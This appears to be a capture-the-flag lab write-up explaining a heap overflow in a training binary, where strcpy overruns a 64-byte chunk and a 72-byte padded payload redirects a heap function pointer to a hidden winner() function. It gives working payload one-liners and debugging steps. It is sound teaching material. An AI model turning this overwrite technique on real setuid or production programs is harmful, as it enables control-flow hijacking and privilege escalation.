# ex10 — Heap Function Pointer Overwrite (Heap Overflow)

## Goal

Exploit a **heap overflow** to overwrite a **function pointer stored on the heap** so that the program executes the hidden `winner()` function instead of `nowinner()`.

---

# Vulnerability

The program allocates **two heap chunks**:

```c
char *data = malloc(64);
void (**fp)() = malloc(4);

*fp = nowinner;

strcpy(data, argv[1]);

(*fp)();
```

The bug is:

```c
strcpy(data, argv[1]);
```

`strcpy()` performs **no bounds checking**.

If the input is longer than 64 bytes, it continues writing past the end of the first heap chunk and begins overwriting whatever comes next in memory.

The next allocation is the function pointer.

---

# Binary Analysis

```
file bin
```

```
setuid ELF 32-bit
```

Useful strings:

```
strings bin
```

```
level passed
level has not been passed
data is at %p, fp is at %p
```

---

# Disassembly of main()

```asm
malloc(64)          --> data
malloc(4)           --> fp

*fp = nowinner

strcpy(data, argv[1])

call *fp
```

Relevant instructions:

```asm
call malloc
mov eax,[data]

call malloc
mov eax,[fp]

mov $nowinner,(fp)

call strcpy

mov eax,[fp]
mov eax,[eax]

call *eax
```

The indirect call

```asm
call *%eax
```

means:

> Execute the function whose address is stored inside the function pointer.

That is exactly what we overwrite.

---

# Symbol Table

```
objdump -t bin
```

Important symbols:

```
winner      0x08048464

nowinner    0x08048478

main        0x0804848c
```

The target address is therefore

```
winner = 0x08048464
```

Little-endian representation:

```
64 84 04 08

\x64\x84\x04\x08
```

---

# Heap Layout

Before the overflow

```
Heap
──────────────────────────────────────────────

data chunk
+------------------------------+
| 64-byte buffer               |
+------------------------------+

malloc metadata
+--------+
| 8 bytes|
+--------+

fp chunk
+------------------------------+
| pointer -> nowinner()        |
+------------------------------+
```

---

# Program Output

Running

```bash
./bin AAAA
```

prints

```
data is at 0x87a6008
fp is at   0x87a6050
```

Difference

```
0x87a6050
-0x87a6008
----------
0x48 = 72 bytes
```

The first heap buffer starts at

```
data
```

The function pointer starts

```
72 bytes
```

later.

---

# Why 72 Bytes?

The first allocation is

```
malloc(64)
```

glibc adds heap metadata after the chunk.

Layout:

```
64 bytes user data

+

8 bytes heap metadata

=

72 bytes
```

Therefore

```
64 + 8 = 72
```

Exactly the distance printed by the program.

---

# Memory Diagram

```
Address

data
│
▼

+--------------------------------+
|AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA|
|AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA| 64 bytes
+--------------------------------+

+--------+
|metadata| 8 bytes
+--------+

fp
│
▼

+----------------+
| nowinner addr  |
+----------------+
```

Overflow:

```
AAAAAAAA....(72 bytes)

↓

+--------------------------------+
|AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA|
|AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA|
+--------------------------------+

+--------+
|AAAAAAAA|
+--------+

+----------------+
| winner address |
+----------------+
```

The function pointer becomes

```
winner()
```

instead of

```
nowinner()
```

---

# Why Little Endian?

The address

```
0x08048464
```

is stored in memory least-significant byte first.

```
0x08 04 84 64

↓

64 84 04 08
```

Payload bytes

```python
b"\x64\x84\x04\x08"
```

---

# Payload

Python 3

```bash
python3 -c 'import sys;sys.stdout.buffer.write(b"A"*72+b"\x64\x84\x04\x08")'
```

Execute directly:

```bash
./bin "$(python3 -c 'import sys;sys.stdout.buffer.write(b"A"*72+b"\x64\x84\x04\x08")')"
```

Or with Python 2:

```bash
./bin $(python -c "print 'A'*72 + '\x64\x84\x04\x08'")
```

---

# Expected Output

```
data is at 0xXXXXXXXX
fp is at   0xXXXXXXXX

level passed
```

---

# How We Found the Offset

Run normally

```bash
./bin AAAA
```

Output

```
data is at 0x87a6008
fp is at 0x87a6050
```

Subtract the addresses

```
0x6050
-
0x6008
------
0x48
```

Convert hexadecimal

```
0x48 = 72
```

So

```
72 bytes
```

are required before overwriting the function pointer.

---

# Exploitation Steps

### 1. Inspect the binary

```bash
file bin
strings bin
```

---

### 2. Find useful functions

```bash
objdump -t bin | grep winner
```

Output

```
08048464 winner
08048478 nowinner
```

---

### 3. Disassemble `main`

```bash
gdb ./bin
```

```gdb
disassemble main
```

Observe

```
malloc(64)

malloc(4)

strcpy()

call *fp
```

---

### 4. Verify heap addresses

```bash
./bin AAAA
```

Example

```
data is at 0x87a6008
fp is at   0x87a6050
```

Compute

```
fp - data = 72 bytes
```

---

### 5. Build the payload

```bash
python3 -c 'import sys;sys.stdout.buffer.write(b"A"*72+b"\x64\x84\x04\x08")'
```

---

### 6. Execute the exploit

```bash
./bin "$(python3 -c 'import sys;sys.stdout.buffer.write(b"A"*72+b"\x64\x84\x04\x08")')"
```

---

### 7. Success

```
level passed
```

---

# Key Concepts Learned

* Heap buffer overflow
* `malloc()` chunk layout
* Heap metadata overhead
* Function pointers
* Indirect function calls (`call *%eax`)
* Overwriting adjacent heap objects
* Calculating heap offsets from leaked addresses
* Little-endian address encoding
* Redirecting execution by overwriting a function pointer

---

# Exploit Summary

```
malloc(64)
        │
        ▼

data buffer
        │
        │ strcpy()
        ▼

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
                         72 bytes

Overwrite

function pointer

↓

nowinner()

↓

winner()

↓

call *fp

↓

level passed
```

This challenge demonstrates a classic **heap-based function pointer overwrite**. Unlike a stack overflow that overwrites a return address, the overflow stays entirely on the heap and redirects execution by corrupting a neighboring heap object—a function pointer—causing the indirect `call *%eax` to jump to `winner()` and print **"level passed."**
